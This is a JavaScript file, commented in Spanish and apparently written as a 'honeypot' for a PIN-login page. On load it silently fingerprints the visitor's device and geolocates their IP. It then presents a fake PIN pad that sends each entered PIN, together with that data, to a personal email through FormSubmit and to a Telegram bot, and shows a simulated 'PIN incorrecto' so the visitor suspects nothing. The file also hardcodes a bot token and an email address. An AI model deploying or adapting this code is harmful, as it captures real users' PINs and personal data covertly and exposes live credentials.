// ============================================================================
// HONEYPOT / TRAMPA DE SEGURIDAD - COMANDERO VF
// ============================================================================

const DEST_EMAIL = 'jongt23@gmail.com';

// Opcional: Si tienes un bot de Telegram, pon tu TOKEN y CHAT ID aquí
const TELEGRAM_BOT_TOKEN = '8650497450:AAFB-QkgD8WmrlJsG0EhvMF0wICrECwPS-8';
const TELEGRAM_CHAT_ID   = '32759013';

let pinBuffer = '';
let datosDispositivo = {};
let ipData = {};
let yaEnviado = false;

// ── 1. RECOPILACIÓN SILENCIOSA AL CARGAR LA PÁGINA ────────────────────────────
async function recopilarDatosIniciales() {
  try {
    // Información básica del navegador y hardware
    datosDispositivo = {
      userAgent: navigator.userAgent,
      platform: navigator.platform || (navigator.userAgentData && navigator.userAgentData.platform) || 'Desconocida',
      language: navigator.language || (navigator.languages && navigator.languages[0]) || 'Desconocido',
      languages: (navigator.languages || []).join(', '),
      timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Desconocida',
      screenResolution: `${window.screen.width}x${window.screen.height} (DPR: ${window.devicePixelRatio || 1})`,
      viewportSize: `${window.innerWidth}x${window.innerHeight}`,
      touchPoints: navigator.maxTouchPoints || 0,
      coresCPU: navigator.hardwareConcurrency || 'N/A',
      ramGB: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
      urlAcceso: window.location.href,
      referrer: document.referrer || 'Acceso directo',
      fechaApertura: new Date().toLocaleString('es-ES', { timeZoneName: 'short' }),
      timestampUTC: new Date().toISOString()
    };

    // Conexión de red estimada
    if (navigator.connection) {
      datosDispositivo.conexionTipo = navigator.connection.effectiveType || 'N/A';
      datosDispositivo.conexionDownlink = navigator.connection.downlink ? `${navigator.connection.downlink} Mbps` : 'N/A';
      datosDispositivo.conexionRtt = navigator.connection.rtt ? `${navigator.connection.rtt} ms` : 'N/A';
    }

    // Batería (si el navegador lo soporta)
    if (navigator.getBattery) {
      try {
        const batt = await navigator.getBattery();
        datosDispositivo.bateriaNivel = `${Math.round(batt.level * 100)}%`;
        datosDispositivo.bateriaCargando = batt.charging ? 'Sí' : 'No';
      } catch (_) {}
    }

    // Obtener IP pública y geolocalización por IP
    await obtenerGeoIP();
  } catch (err) {
    console.error("Init honeypot error:", err);
  }
}

async function obtenerGeoIP() {
  // Intentamos obtener IP + detalles de ubicación mediante ipwho.is o ipapi.co
  try {
    const res = await fetch('https://ipwho.is/', { cache: 'no-store' });
    const data = await res.json();
    if (data && data.success !== false) {
      ipData = {
        ip: data.ip,
        tipo: data.type,
        ciudad: data.city,
        region: data.region,
        pais: data.country,
        codigoPais: data.country_code,
        codigoPostal: data.postal,
        latitud: data.latitude,
        longitud: data.longitude,
        isp: data.connection ? data.connection.isp : (data.isp || 'N/A'),
        org: data.connection ? data.connection.org : 'N/A',
        dominio: data.connection ? data.connection.domain : 'N/A',
        zonaHoraria: data.timezone ? data.timezone.id : 'N/A'
      };
      return;
    }
  } catch (_) {}

  // Fallback secundario si el primero falla
  try {
    const res2 = await fetch('https://api.ipify.org?format=json');
    const data2 = await res2.json();
    ipData = { ip: data2.ip, proveedor: 'ipify fallback' };
  } catch (_) {}
}

// ── 2. ENVÍO DE ALERTAS ───────────────────────────────────────────────────────
async function enviarAlerta(pinProbado) {
  const fechaActual = new Date().toLocaleString('es-ES', { timeZoneName: 'short' });
  const ipTexto = ipData.ip || 'No detectada';
  const ubicacionTexto = (ipData.ciudad ? `${ipData.ciudad}, ${ipData.region} (${ipData.pais})` : 'Desconocida');
  const mapaUrl = (ipData.latitud && ipData.longitud) ? `https://www.google.com/maps?q=${ipData.latitud},${ipData.longitud}` : 'N/A';

  const cuerpoInforme = {
    _subject: `🚨 ALERTA INTRUSO COMANDERO - PIN Probado: [${pinProbado}] - IP: ${ipTexto}`,
    _template: 'table',
    _captcha: 'false',
    PIN_PROBADO: pinProbado,
    FECHA_HORA: fechaActual,
    IP_PUBLICA: ipTexto,
    UBICACION_APROX: ubicacionTexto,
    ISP_PROVEEDOR: ipData.isp || 'N/A',
    COORDENADAS_MAPA: mapaUrl,
    DISPOSITIVO_USER_AGENT: datosDispositivo.userAgent || 'N/A',
    SISTEMA_OPERATIVO: datosDispositivo.platform || 'N/A',
    RESOLUCION_PANTALLA: datosDispositivo.screenResolution || 'N/A',
    PANTALLA_TACTIL: datosDispositivo.touchPoints > 0 ? `Sí (${datosDispositivo.touchPoints} puntos)` : 'No / Ratón',
    BATERIA: datosDispositivo.bateriaNivel ? `${datosDispositivo.bateriaNivel} (Cargando: ${datosDispositivo.bateriaCargando})` : 'N/A',
    CONEXION_RED: datosDispositivo.conexionTipo || 'N/A',
    IDIOMA_NAVEGADOR: datosDispositivo.language || 'N/A',
    ZONA_HORARIA: datosDispositivo.timeZone || 'N/A',
    URL_ORIGEN: datosDispositivo.urlAcceso || 'N/A',
    REFERRER: datosDispositivo.referrer || 'N/A'
  };

  // 1. Enviar por Email mediante FormSubmit (AJAX JSON)
  try {
    await fetch(`https://formsubmit.co/ajax/${DEST_EMAIL}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify(cuerpoInforme)
    });
  } catch (e) {
    console.error("Error enviando email honeypot:", e);
  }

  // 2. Enviar por Telegram Bot (si está configurado)
  if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
    try {
      const msgTelegram = `🚨 <b>ALERTA HONEYPOT COMANDERO</b>\n\n` +
        `🔑 <b>PIN probado:</b> <code>${pinProbado}</code>\n` +
        `🌐 <b>IP:</b> <code>${ipTexto}</code>\n` +
        `📍 <b>Ubicación:</b> ${ubicacionTexto}\n` +
        `🏢 <b>ISP / Operador:</b> ${ipData.isp || 'N/A'}\n` +
        `📱 <b>Dispositivo:</b> ${datosDispositivo.platform || 'N/A'}\n` +
        `🔋 <b>Batería:</b> ${datosDispositivo.bateriaNivel || 'N/A'}\n` +
        `🗺 <b>Mapa:</b> ${mapaUrl}\n` +
        `⏰ <b>Hora:</b> ${fechaActual}`;

      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: msgTelegram,
          parse_mode: 'HTML'
        })
      });
    } catch (e) {
      console.error("Error enviando Telegram:", e);
    }
  }
}

// ── 3. MANEJO DEL TECLADO PIN Y SIMULACIÓN ─────────────────────────────────────
function updatePinDots(error) {
  for (let i = 0; i < 4; i++) {
    const dot = document.getElementById('pd' + i);
    if (dot) {
      dot.className = 'pin-dot' + (i < pinBuffer.length ? (error ? ' error' : ' filled') : '');
    }
  }
}

window.pinKey = async d => {
  if (pinBuffer.length >= 4) return;
  pinBuffer += d;
  updatePinDots(false);

  if (pinBuffer.length === 4) {
    await procesarIntentoPin(pinBuffer);
  }
};

window.pinDel = () => {
  pinBuffer = pinBuffer.slice(0, -1);
  updatePinDots(false);
  const err = document.getElementById('pin-error');
  if (err) err.style.display = 'none';
};

async function procesarIntentoPin(pin) {
  const sub = document.getElementById('pin-sub');
  const err = document.getElementById('pin-error');
  const box = document.getElementById('pin-box');

  if (sub) sub.textContent = 'Conectando con el servidor...';

  // Enviar alerta con todos los datos recopilados
  enviarAlerta(pin);

  // Simular pequeña espera de red realista (1.2 segundos)
  await new Promise(r => setTimeout(r, 1200));

  // Simular fallo sin levantar sospechas
  updatePinDots(true);
  if (box) {
    box.classList.add('shake');
    setTimeout(() => box.classList.remove('shake'), 400);
  }
  if (sub) sub.textContent = 'Introduce tu PIN';
  if (err) {
    err.textContent = 'PIN incorrecto';
    err.style.display = 'block';
  }

  setTimeout(() => {
    pinBuffer = '';
    updatePinDots(false);
  }, 1000);
}

// Asignar eventos de botones
document.addEventListener('DOMContentLoaded', () => {
  recopilarDatosIniciales();

  const pad = document.getElementById('pin-pad');
  if (pad) {
    pad.addEventListener('click', e => {
      const btn = e.target.closest('.pin-key');
      if (!btn) return;
      const k = btn.dataset.k;
      if (k === 'del') window.pinDel();
      else if (k && k !== '') window.pinKey(k);
    });
  }
});
